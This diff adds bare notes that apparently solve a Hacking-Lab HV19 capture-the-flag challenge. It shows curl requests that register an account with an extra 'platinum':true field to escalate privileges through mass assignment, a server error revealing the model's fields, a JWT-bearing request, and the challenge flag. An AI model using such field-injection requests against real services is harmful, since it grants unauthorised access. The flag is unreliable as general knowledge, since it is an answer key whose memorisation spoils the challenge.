@@ -1,0 +1,16 @@
+curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"dkuhn", "password": "passwordpassword", "platinum":true}'
+
+curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"gfdsa", "password": "passwordpassword", "admin":"yes"}'
+
+Unrecognized field "admin" (class ch.dkuhn.hv19.fsja.model.User), not marked as ignorable (3 known properties: "password", "platinum", "username"])
+at [Source: org.glassfish.jersey.message.internal.ReaderInterceptorExecutor$UnCloseableInputStream@27a6c4c6; line: 1, column: 63] (through reference chain: ch.dkuhn.hv19.fsja.model.User["admin"])
+
+curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"gfdsa", "password": "passwordpassword", "platinum":true}'
+
+curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"gfdsa", "password": "passwordpassword", "platinum":true}}'
+
+curl -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiZ2Zkc2EiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA1Njk2OC42OTQwMDAwMDB9.ESixd9xDQET3SYe418W7Uc5UYPQvHAg42WxWnyY7oIQ"
+
+
+HV19{an0ther-DaILYgn}
+
